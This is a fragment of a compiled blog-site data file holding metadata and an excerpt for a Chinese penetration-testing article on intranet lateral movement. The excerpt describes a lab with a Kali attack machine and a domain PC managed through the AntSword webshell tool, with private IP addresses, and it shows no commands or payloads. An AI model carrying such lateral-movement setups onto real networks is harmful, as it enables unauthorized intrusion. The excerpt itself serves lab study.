},{"level":2,"title":"总结一下","slug":"总结一下","link":"#总结一下","children":[]},{"level":2,"title":"参考链接","slug":"参考链接","link":"#参考链接","children":[]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":28.09,"words":8427},"filePathRelative":"渗透测试/内网体系建设/内网横向移动.md","localizedDate":"2023年9月3日","excerpt":"\\n<h2>环境搭建</h2>\\n<p>攻击机kali:192.168.14.131</p>\\n<p>域内机器PC方便测试我添加了两张网卡，一张同通向kali，一张通向域内机器DC，用蚁剑管理，方便横向测试</p>\\n<div class=\\"language- line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"\\" data-title=\\"\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>IP1 :192.168.14.110</span></span>\\n<span class=\\"line\\"><span>IP2 :192.168.30.20</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{o as comp,d as data};
